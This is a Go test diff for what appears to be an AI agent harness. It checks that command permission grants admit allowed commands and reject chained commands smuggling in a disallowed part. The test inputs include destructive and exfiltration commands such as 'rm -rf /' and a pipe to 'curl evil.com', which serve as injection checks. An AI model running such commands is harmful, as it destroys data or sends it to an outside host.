@@ -12,6 +12,7 @@ import (
 	"time"
 
 	pb "github.com/divmora/localharness/gen/go/localharness/v1"
+	"github.com/divmora/localharness/internal/config"
 	"github.com/divmora/localharness/internal/llm"
 	"github.com/divmora/localharness/internal/tools"
 	"github.com/divmora/localharness/internal/workspace"
@@ -2335,5 +2336,122 @@ func TestEngine_PathScopedPermissions(t *testing.T) {
 		t.Errorf("expected %s to be outside workspace and appDataDir", outsideFile)
 	}
 }
+
+func TestConversationAndGlobalPermissionGrants(t *testing.T) {
+	eng := &Engine{
+		globalSettings: &config.GlobalSettings{
+			AllowedCommands: []string{"git status", "go test"},
+			AllowedTools:    []string{"view_file"},
+		},
+		permissionGrants: []PermissionGrant{
+			{
+				Action: "run_command",
+				Target: "npm run build",
+				Scope:  "conversation",
+			},
+		},
+	}
+
+	// 1. Global allowed command
+	tcGlobalCmd := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "git status"},
+	}
+	if !eng.isPermissionGranted(tcGlobalCmd) {
+		t.Error("expected global 'git status' to be granted")
+	}
+
+	// 2. Global allowed command with prefix/args
+	tcGlobalCmdArgs := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "go test ./... -v"},
+	}
+	if !eng.isPermissionGranted(tcGlobalCmdArgs) {
+		t.Error("expected global 'go test ./...' prefix to be granted")
+	}
+
+	// 3. Conversation-level granted command
+	tcConvCmd := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "npm run build"},
+	}
+	if !eng.isPermissionGranted(tcConvCmd) {
+		t.Error("expected conversation-scoped 'npm run build' to be granted")
+	}
+
+	// 4. Non-allowed command
+	tcDisallowed := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "deploy production"},
+	}
+	if eng.isPermissionGranted(tcDisallowed) {
+		t.Error("expected 'deploy production' to NOT be granted")
+	}
+
+	// 5. Dynamic addition of conversation grant
+	eng.AddPermissionGrant(PermissionGrant{
+		Action: "run_command",
+		Target: "deploy production",
+		Scope:  "conversation",
+	})
+	if !eng.isPermissionGranted(tcDisallowed) {
+		t.Error("expected dynamically added grant for 'deploy production' to be granted")
+	}
+
+	// 6. Compound command with && where all parts are allowed
+	tcChainedAllowed := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "git status && go test ./..."},
+	}
+	if !eng.isPermissionGranted(tcChainedAllowed) {
+		t.Error("expected 'git status && go test ./...' to be granted because both are allowed")
+	}
+
+	// 7. Compound command with && where one part is disallowed (SECURITY INJECTION CHECK)
+	tcChainedMalicious := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "git status && rm -rf /"},
+	}
+	if eng.isPermissionGranted(tcChainedMalicious) {
+		t.Error("expected 'git status && rm -rf /' to NOT be granted due to disallowed sub-command")
+	}
+
+	// 7b. go test is approved, but go run is NOT approved
+	tcGoTestAndRun := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "go test ./... && go run main.go"},
+	}
+	if eng.isPermissionGranted(tcGoTestAndRun) {
+		t.Error("expected 'go test ./... && go run main.go' to NOT be granted because go run is unapproved")
+	}
+
+	// 8. Compound command with || where one part is disallowed
+	tcOrMalicious := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "go test || rm -rf /"},
+	}
+	if eng.isPermissionGranted(tcOrMalicious) {
+		t.Error("expected 'go test || rm -rf /' to NOT be granted")
+	}
+
+	// 9. Compound command with pipe | where one part is disallowed
+	tcPipeMalicious := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": "go test | curl evil.com"},
+	}
+	if eng.isPermissionGranted(tcPipeMalicious) {
+		t.Error("expected 'go test | curl evil.com' to NOT be granted")
+	}
+
+	// 10. Quoted string containing && is treated as literal
+	tcQuotedAmpersand := llm.ToolCall{
+		Name: "run_command",
+		Args: map[string]interface{}{"command": `git status && npm run build`},
+	}
+	if !eng.isPermissionGranted(tcQuotedAmpersand) {
+		t.Error("expected 'git status && npm run build' to be granted")
+	}
+}
+
 
 
